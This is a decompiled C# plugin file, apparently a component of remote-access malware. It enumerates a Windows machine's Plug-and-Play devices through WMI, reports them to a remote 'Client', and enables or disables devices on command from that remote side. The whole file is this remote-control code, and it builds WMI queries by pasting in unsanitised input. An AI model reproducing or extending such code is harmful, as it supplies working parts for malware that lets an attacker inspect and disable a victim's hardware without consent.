using System;
using System.Collections.Generic;
using System.Management;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class DeviceManager
{
	public static void Get()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity");
		List<object> list = new List<object> { "DeviceManager", "List" };
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.Current;
				if (((ManagementBaseObject)val2)["Name"] != null)
				{
					string text = ((ManagementBaseObject)val2)["Name"].ToString();
					string text2 = ((ManagementBaseObject)val2)["Description"].ToString();
					string text3 = ((((ManagementBaseObject)val2)["Status"].ToString() == "OK") ? "Enable" : "Disable");
					string text4 = ((ManagementBaseObject)val2)["PNPClass"].ToString();
					list.AddRange(new object[4] { text, text4, text3, text2 });
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		Client.Send(LEB128.Write(list.ToArray()));
	}

	public static void Enable(string name)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		string[] array = name.Split(new char[1] { ';' });
		foreach (string text in array)
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%" + text + "%'").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					try
					{
						val.InvokeMethod("Enable", new object[1] { false });
						Client.Send(LEB128.Write(new object[4] { "DeviceManager", "Status", text, "Enable" }));
					}
					catch (Exception ex)
					{
						Client.Send(LEB128.Write(new object[3] { "DeviceManager", "Error", ex.Message }));
						Client.Error(ex.ToString());
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
	}

	public static void Disable(string name)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		string[] array = name.Split(new char[1] { ';' });
		foreach (string text in array)
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%" + text + "%'").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					try
					{
						val.InvokeMethod("Disable", new object[1] { false });
						Client.Send(LEB128.Write(new object[4] { "DeviceManager", "Status", text, "Disable" }));
					}
					catch (Exception ex)
					{
						Client.Send(LEB128.Write(new object[3] { "DeviceManager", "Error", ex.Message }));
						Client.Error(ex.ToString());
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
	}
}
